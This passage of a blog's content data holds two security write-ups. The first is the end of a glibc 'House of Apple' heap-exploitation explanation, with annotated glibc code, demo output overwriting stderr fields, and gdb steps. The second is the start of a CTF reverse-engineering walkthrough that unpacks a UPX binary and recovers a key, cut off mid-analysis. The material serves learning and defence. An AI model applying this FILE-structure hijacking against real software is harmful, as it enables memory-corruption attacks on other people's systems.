style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">void\u003C/span>\u003Cspan style=\"color:#B392F0\"> _IO_vtable_check\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#79B8FF\"> _IO_jump_t\u003C/span>\u003Cspan style=\"color:#F97583\"> *\u003C/span>\u003Cspan style=\"color:#FFAB70\">vtable\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Check if vtable is in valid range\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (vtable \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">__start__IO_vtables \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        vtable \u003C/span>\u003Cspan style=\"color:#F97583\">>=\u003C/span>\u003Cspan style=\"color:#F97583\"> &#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">__stop__IO_vtables) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">        abort\u003C/span>\u003Cspan style=\"color:#E1E4E8\">();\u003C/span>\u003Cspan style=\"color:#6A737D\">  // Kill the program!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Col>\n\u003Cli>We use \u003Ccode>_IO_wfile_jumps\u003C/code> (a real vtable)\u003C/li>\n\u003Cli>But \u003Ccode>_wide_vtable\u003C/code> is NOT checked\u003C/li>\n\u003Cli>When \u003Ccode>doallocate\u003C/code> is called from \u003Ccode>_wide_vtable\u003C/code>, it executes our function\u003C/li>\n\u003C/ol>\n\u003Cp>\u003Cimg src=\"/images/posts/an-apple-a-day/apple-10.png\" alt=\"Exploit Diagram\">\u003C/p>\n\u003Ch2 id=\"more-on-house-of-apple-how-it-works\">More on house of apple how it works\u003C/h2>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#79B8FF\"> wint_t\u003C/span>\u003Cspan style=\"color:#B392F0\"> _IO_wstrn_overflow\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (FILE \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">fp\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">wint_t\u003C/span>\u003Cspan style=\"color:#FFAB70\"> c\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    _IO_wstrnfile \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">snf \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (_IO_wstrnfile \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) fp;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Key Check: if this passes, we write to memory!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (fp->_wide_data->_IO_buf_base \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> snf->overflow_buf)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // VULNERABILITY: Writes heap address to controlled location!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">        // overflow_buf is at fp + 0xf0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        fp->_wide_data->_IO_write_base \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> snf->overflow_buf;\u003C/span>\u003Cspan style=\"color:#6A737D\">   // [_wide_data+0x18\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        fp->_wide_data->_IO_read_base \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> snf->overflow_buf;\u003C/span>\u003Cspan style=\"color:#6A737D\">    // [_wide_data+0x10\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        fp->_wide_data->_IO_read_ptr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> snf->overflow_buf;\u003C/span>\u003Cspan style=\"color:#6A737D\">     // [_wide_data+0x00\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        fp->_wide_data->_IO_read_end \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> snf->overflow_buf \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> N;\u003C/span>\u003Cspan style=\"color:#6A737D\"> // [_wide_data+0x08\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">    // Additional writes\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    fp->_wide_data->_IO_write_ptr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> snf->overflow_buf;\u003C/span>\u003Cspan style=\"color:#6A737D\">  // [_wide_data+0x20]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    fp->_wide_data->_IO_write_end \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> snf->overflow_buf;\u003C/span>\u003Cspan style=\"color:#6A737D\">  // [_wide_data+0x28]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> c;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>IMPACT:\u003C/strong> By controlling \u003Ccode>fp->_wide_data\u003C/code>, we control WHERE these heap addresses are written!\u003C/p>\n\u003Ch3 id=\"demo-program-output\">Demo Program Output\u003C/h3>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>[*] allocate a 0x100 chunk\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>===========================old value=======================\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[0x2a410310]: 0x1122334455667788  0x1122334455667788\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[0x2a410320]: 0x1122334455667788  0x1122334455667788\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[0x2a410330]: 0x1122334455667788  0x1122334455667788\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[0x2a410340]: 0x1122334455667788  0x1122334455667788\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>===========================old value=======================\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[*] puts address: 0x7fd0ca691cc0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[*] stderr->_IO_write_ptr address: 0x7fd0ca82b478\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[*] stderr->_flags2 address: 0x7fd0ca82b4c4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[*] stderr->_wide_data address: 0x7fd0ca82b4f0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[*] stderr->vtable address: 0x7fd0ca82b528\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[*] _IO_wstrn_jumps address: 0x7fd0ca826b90\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[+] step 1: change stderr->_IO_write_ptr to -1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[+] step 2: change stderr->_flags2 to 8\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[+] step 3: replace stderr->_wide_data with the allocated chunk\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[+] step 4: replace stderr->vtable with _IO_wstrn_jumps\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[+] step 5: call fcloseall and trigger house of apple\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>===========================new value=======================\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[0x2a410310]: 0x00007fd0ca82b770  0x00007fd0ca82b870\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[0x2a410320]: 0x00007fd0ca82b770  0x00007fd0ca82b770\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[0x2a410330]: 0x00007fd0ca82b770  0x00007fd0ca82b770\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>[0x2a410340]: 0x00007fd0ca82b770  0x00007fd0ca82b870\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>===========================new value=======================\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\u003Ctable>\u003Cthead>\u003Ctr>\u003Cth>Phase\u003C/th>\u003Cth>Memory Address\u003C/th>\u003Cth>Value\u003C/th>\u003Cth>Explanation\u003C/th>\u003C/tr>\u003C/thead>\u003Ctbody>\u003Ctr>\u003Ctd>\u003Cstrong>BEFORE\u003C/strong>\u003C/td>\u003Ctd>\u003Ccode>0x2a410310\u003C/code>\u003C/td>\u003Ctd>\u003Ccode>0x1122334455667788\u003C/code>\u003C/td>\u003Ctd>Controlled fill value we set initially\u003C/td>\u003C/tr>\u003Ctr>\u003Ctd>\u003Cstrong>AFTER\u003C/strong>\u003C/td>\u003Ctd>\u003Ccode>0x2a410310\u003C/code>\u003C/td>\u003Ctd>\u003Ccode>0x00007fd0ca82b770\u003C/code>\u003C/td>\u003Ctd>\u003Ccode>stderr->overflow_buf\u003C/code> address leaked!\u003C/td>\u003C/tr>\u003C/tbody>\u003C/table>\n\u003Cp>\u003Cstrong>This demonstrates:\u003C/strong> We can write a known address (overflow_buf = heap/libc addr) to ANY memory location we control via \u003Ccode>_wide_data\u003C/code> :)\u003C/p>\n\u003Ch4 id=\"step-1-set-breakpoint-before-fcloseall\">Step 1: Set Breakpoint Before fcloseall()\u003C/h4>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>gdb ./house_of_apple\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>break fcloseall\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>run\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"step-2-examine-hijacked-stderr-structure\">Step 2: Examine Hijacked stderr Structure\u003C/h4>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan># Check stderr location\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>p stderr\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan># $1 = (struct _IO_FILE *) 0x7ffff7e2b4a0 &#x3C;_IO_2_1_stderr_>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan># Examine critical members\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>x/gx (stderr + 0x28)  # _IO_write_ptr (should be -1)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>x/gx (stderr + 0x74)  # _flags2 (should be 8)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>x/gx (stderr + 0xa0)  # _wide_data (should point to our chunk)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>x/gx (stderr + 0xd8)  # vtable (should be _IO_wstrn_jumps)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Expected Output:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>_IO_write_ptr:  0xffffffffffffffff  (-1)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>_flags2:        0x0000000000000008  (wide mode enabled)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>_wide_data:     0x0000000000405310  (our controlled chunk!)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>vtable:         0x00007ffff7e26b90  (_IO_wstrn_jumps)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"step-3-examine-target-chunk-before-attack\">Step 3: Examine Target Chunk BEFORE Attack\u003C/h4>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan># Our chunk that _wide_data points to\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>x/16gx 0x405310\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Output:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>0x405310: 0x1122334455667788  0x1122334455667788\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x405320: 0x1122334455667788  0x1122334455667788\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x405330: 0x1122334455667788  0x1122334455667788\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x405340: 0x1122334455667788  0x1122334455667788\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"step-4-continue-and-break-after-_io_wstrn_overflow\">Step 4: Continue and Break After _IO_wstrn_overflow\u003C/h4>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>break _IO_wstrn_overflow\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>continue\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan># Inside _IO_wstrn_overflow, examine:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>print/x $rdi              # fp (our fake _IO_FILE)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>print/x $rdi + 0xf0       # overflow_buf address\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>x/gx $rdi + 0xa0          # fp->_wide_data (our target chunk)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"step-5-examine-target-chunk-after-attack\">Step 5: Examine Target Chunk AFTER Attack\u003C/h4>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>finish  # Return from _IO_wstrn_overflow\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>x/16gx 0x405310  # Check our chunk again\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>\u003Cstrong>Output:\u003C/strong>\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"plaintext\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan>0x405310: 0x00007ffff7e2b770  0x00007ffff7e2b870  ← CHANGED!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x405320: 0x00007ffff7e2b770  0x00007ffff7e2b770  ← CHANGED!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x405330: 0x00007ffff7e2b770  0x00007ffff7e2b770  ← CHANGED!\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan>0x405340: 0x00007ffff7e2b770  0x00007ffff7e2b870  ← CHANGED!\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch3 id=\"sum-factz\">SUM FACTZ\u003C/h3>\n\u003Col>\n\u003Cli>\u003Cstrong>Before:\u003C/strong> Chunk filled with \u003Ccode>0x1122334455667788\u003C/code>\u003C/li>\n\u003Cli>\u003Cstrong>After:\u003C/strong> Chunk filled with \u003Ccode>0x00007ffff7e2b770\u003C/code> (overflow_buf address)\u003C/li>\n\u003C/ol>",{"headings":225,"localImagePaths":311,"remoteImagePaths":312,"frontmatter":313,"imagePaths":314},[226,229,232,235,238,241,244,247,250,253,256,259,263,266,269,272,275,278,281,284,287,290,293,296,299,302,305,308],{"depth":40,"slug":227,"text":228},"enabled-protections","Enabled Protections",{"depth":40,"slug":230,"text":231},"disabled-protections","Disabled Protections",{"depth":27,"slug":233,"text":234},"what-is-a-vtable","What is a Vtable?",{"depth":40,"slug":236,"text":237},"glibc-internals","glibc Internals",{"depth":27,"slug":239,"text":240},"what-is-_wide_data","What is _wide_data?",{"depth":24,"slug":242,"text":243},"glibc-vtable-exploitation","glibc vtable exploitation",{"depth":27,"slug":245,"text":246},"what-_mode-does","What _mode does",{"depth":27,"slug":248,"text":249},"part-a-fake-_io_file-structure","Part A: Fake _IO_FILE structure",{"depth":27,"slug":251,"text":252},"part-b-fake-_io_wide_data","Part B: Fake _IO_wide_data",{"depth":27,"slug":254,"text":255},"part-c-fake-wide-vtable","Part C: Fake wide vtable",{"depth":27,"slug":257,"text":258},"how-everything-is-laid-out-in-memory","How everything is laid out in memory",{"depth":260,"slug":261,"text":262},4,"leaking-the-heap-address","Leaking the heap address",{"depth":260,"slug":264,"text":265},"patching-the-fake-file-pointers","Patching the fake FILE pointers",{"depth":260,"slug":267,"text":268},"hijacking-_io_list_all","Hijacking _IO_list_all",{"depth":40,"slug":270,"text":271},"final-exploit","final exploit",{"depth":40,"slug":273,"text":274},"helper-functions","Helper Functions",{"depth":40,"slug":276,"text":277},"exploitation","Exploitation",{"depth":27,"slug":279,"text":280},"why-this-works","Why This Works",{"depth":40,"slug":282,"text":283},"the-glibc-call-chain","The glibc Call Chain",{"depth":40,"slug":285,"text":286},"the-bypass","The Bypass",{"depth":27,"slug":288,"text":289},"more-on-house-of-apple-how-it-works","More on house of apple how it works",{"depth":40,"slug":291,"text":292},"demo-program-output","Demo Program Output",{"depth":260,"slug":294,"text":295},"step-1-set-breakpoint-before-fcloseall","Step 1: Set Breakpoint Before fcloseall()",{"depth":260,"slug":297,"text":298},"step-2-examine-hijacked-stderr-structure","Step 2: Examine Hijacked stderr Structure",{"depth":260,"slug":300,"text":301},"step-3-examine-target-chunk-before-attack","Step 3: Examine Target Chunk BEFORE Attack",{"depth":260,"slug":303,"text":304},"step-4-continue-and-break-after-_io_wstrn_overflow","Step 4: Continue and Break After _IO_wstrn_overflow",{"depth":260,"slug":306,"text":307},"step-5-examine-target-chunk-after-attack","Step 5: Examine Target Chunk AFTER Attack",{"depth":40,"slug":309,"text":310},"sum-factz","SUM FACTZ",[],[],{"title":217,"date":147},[],"strings-dont-lie-packers-do",{"id":315,"data":317,"body":320,"filePath":321,"digest":322,"rendered":323},{"title":318,"date":319},"Strings Don't Lie, Packers Do",["Date","2025-12-29T00:00:00.000Z"],"*Note - always check for UPX, wasted half an hour because i didnt unpack the binary*\r\n\r\n## Binary Analysis\r\n\r\n```bash\r\n$ file './flag{key1+key2}'\r\n./flag{key1+key2}: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),\r\ndynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32,\r\nBuildID[sha1]=77c06ef6af332d2e5def19f42f2b60fcf2c5d2e6, not stripped\r\n```\r\n\r\nKey observations:\r\n- 32-bit ELF binary\r\n- Dynamically linked (requires 32-bit libraries)\r\n- Not stripped (symbols intact - easier to analyze)\r\n\r\n## Initial Execution\r\n\r\n```bash\r\n$ ./flag{key1+key2}\r\n[No output]\r\n```\r\n\r\nThe binary runs but produces no output. Maybe the key is in the binary itself?\r\n\r\n## Detecting the Packer\r\n\r\n```bash\r\n$ strings './flag{key1+key2}' | grep -i upx\r\n$Info: This file is packed with the UPX executable packer http://upx.sf.net $\r\n$Id: UPX 3.91 Copyright (C) 1996-2013 the UPX Team. All Rights Reserved. $\r\nPROT_EXEC|PROT_WRITE failed.\r\n```\r\n\r\nThe binary is packed with UPX (Ultimate Packer for eXecutables) version 3.91.\r\n\r\n## Unpacking with UPX\r\n\r\n```bash\r\n$ upx -d './flag{key1+key2}'\r\n                       Ultimate Packer for eXecutables\r\n                          Copyright (C) 1996 - 2025\r\nUPX 5.0.2       Markus Oberhumer, Laszlo Molnar & John Reiser   Jul 20th 2025\r\n\r\n        File size         Ratio      Format      Name\r\n   --------------------   ------   -----------   -----------\r\n[WARNING] bad b_info at 0x12948\r\n[WARNING] ... recovery at 0x12944\r\n    194808 \u003C-     85996   44.14%   linux/i386    flag{key1+key2}\r\n\r\nUnpacked 1 file.\r\n```\r\n\r\n## Searching for Key-Related Strings\r\n\r\n```bash\r\n$ strings './flag{key1+key2}' | grep -i key\r\nYou don't have the first part of key yet\r\nYou dont have the entire key yet.... :(\r\nkeyjoin.12717834333337631731.tmp.c\r\nmapnode_find_key\r\nmap_key_to_index\r\nmapnode_subkeys\r\nmap_keys_1\r\nSortedMap_keys\r\nmapnode_remove_key\r\nDenseArray_key\r\nmap_keys\r\n```\r\n\r\nImportant strings:\r\n1. `\"You don't have the first part of key yet\"`\r\n2. `\"You dont have the entire key yet.... :(\"`\r\n\r\nThese error messages indicate the binary checks for keys and displays messages when conditions aren't met.\r\n\r\n## Main Function Analysis\r\n\r\n```bash\r\n$ objdump -d -M intel './flag{key1+key2}' | grep -A 50 \"\u003Cmain>:\"\r\n```\r\n\r\nOutput:\r\n```assembly\r\n08068f89 \u003Cmain>:\r\n 8068f89:\t8d 4c 24 04          \tlea    ecx,[esp+0x4]\r\n 8068f8d:\t83 e4 f0             \tand    esp,0xfffffff0\r\n 8068f90:\tff 71 fc             \tpush   DWORD PTR [ecx-0x4]\r\n 8068f93:\t55                   \tpush   ebp\r\n 8068f94:\t89 e5                \tmov    ebp,esp\r\n 8068f96:\t51                   \tpush   ecx\r\n 8068f97:\t83 ec 04             \tsub    esp,0x4\r\n 8068f9a:\t89 c8                \tmov    eax,ecx\r\n 8068f9c:\t83 ec 08             \tsub    esp,0x8\r\n 8068f9f:\tff 70 04             \tpush   DWORD PTR [eax+0x4]\r\n 8068fa2:\tff 30                \tpush   DWORD PTR [eax]\r\n 8068fa4:\te8 f3 93 ff ff       \tcall   806239c \u003C_vinit>\r\n 8068fa9:\t83 c4 10             \tadd    esp,0x10\r\n 8068fac:\te8 cb 8f ff ff       \tcall   8061f7c \u003Cmain__main>\r\n 8068fb1:\tb8 00 00 00 00       \tmov    eax,0x0\r\n 8068fb6:\t8b 4d fc             \tmov    ecx,DWORD PTR [ebp-0x4]\r\n 8068fb9:\tc9                   \tleave\r\n 8068fba:\t8d 61 fc             \tlea    esp,[ecx-0x4]\r\n 8068fbd:\tc3                   \tret\r\n```\r\n\r\n- `main` calls `_vinit` for initialization\r\n- Then calls `main__main` at address `0x8061f7c`\r\n- Returns 0\r\n\r\n### Analyzing main__main\r\n\r\n```bash\r\n$ objdump -d -M intel './flag{key1+key2}' | grep -A 50 \"8061f7c \u003Cmain__main>:\"\r\n```\r\n\r\nKey sections:\r\n```assembly\r\n08061f7c \u003Cmain__main>:\r\n 8061f82:\tc7 45 d8 17 00 00 00 \tmov    DWORD PTR [ebp-0x28],0x17\r\n 8061f89:\tc7 45 dc 8c 09 00 00 \tmov    DWORD PTR [ebp-0x24],0x98c\r\n 8061f90:\t83 7d d8 2d          \tcmp    DWORD PTR [ebp-0x28],0x2d\r\n 8061f94:\t75 07                \tjne    8061f9d \u003Cmain__main+0x21>\r\n 8061f96:\te8 64 00 00 00       \tcall   8061fff \u003Cmain__one>\r\n 8061f9b:\teb 29                \tjmp    8061fc6 \u003Cmain__main+0x4a>\r\n```\r\n\r\nSummary:\r\n- Line `8061f82`: Stores value `0x17` (decimal 23) in local variable\r\n- Line `8061f89`: Stores value `0x98c` (decimal 2444) in local variable\r\n- Line `8061f90`: Compares first value with `0x2d` (decimal 45)\r\n- Since 23 ≠ 45, the jump at `8061f94` is taken\r\n- Line `8061f96`: This call is SKIPPED because the comparison failed\r\n\r\nThe binary intentionally prevents the key functions from being called by using incorrect comparison values.\r\n\r\n## KEY 1: Analyzing main__one\r\n\r\n```bash\r\n$ objdump -d -M intel './flag{key1+key2}' | grep -A 150 \"8061fff \u003Cmain__one>:\"\r\n```\r\n\r\nKey sections:\r\n```assembly\r\n08061fff \u003Cmain__one>:\r\n 8062030:\tc7 45 a8 2d 00 00 00 \tmov    DWORD PTR [ebp-0x58],0x2d\r\n 8062037:\t83 7d a8 1f          \tcmp    DWORD PTR [ebp-0x58],0x1f\r\n 806203b:\t0f 8f 93 00 00 00    \tjg     80620d4 \u003Cmain__one+0xd5>\r\n```\r\n\r\nLoop analysis:\r\n```assembly\r\n 8062058:\tc7 45 a4 02 00 00 00 \tmov    DWORD PTR [ebp-0x5c],0x2\r\n 806207e:\t83 7d a4 0b          \tcmp    DWORD PTR [ebp-0x5c],0xb\r\n 8062082:\t7e dd                \tjle    8062061 \u003Cmain__one+0x62>\r\n```\r\n\r\n- Initialize counter to 2\r\n- Push counter value to array\r\n- Increment counter by 1\r\n- Compare counter with 0xb (11)\r\n- If counter ≤ 11, loop\r\n\r\nResult: Creates array `[2, 3, 4, 5, 6, 7, 8, 9, 10, 11]`\r\n\r\nThen:\r\n```assembly\r\n 806208a:\t6a 08                \tpush   0x8\r\n 806208c:\t6a 02                \tpush   0x2\r\n 806209b:\te8 d0 43 ff ff       \tcall   8056470 \u003Carray_slice>\r\n```\r\n\r\nCall: `array_slice(array, 2, 8)`\r\n\r\nResult: Slices array from index 2 to 8 → `[4, 5, 6, 7, 8, 9]`\r\n\r\n**KEY1 = \"456789\"**\r\n\r\n## KEY 2: Analyzing main__two\r\n\r\n```bash\r\n$ objdump -d -M intel './flag{key1+key2}' | grep -A 250 \"8062131 \u003Cmain__two>:\"\r\n```\r\n\r\nMemory addresses loaded:\r\n- 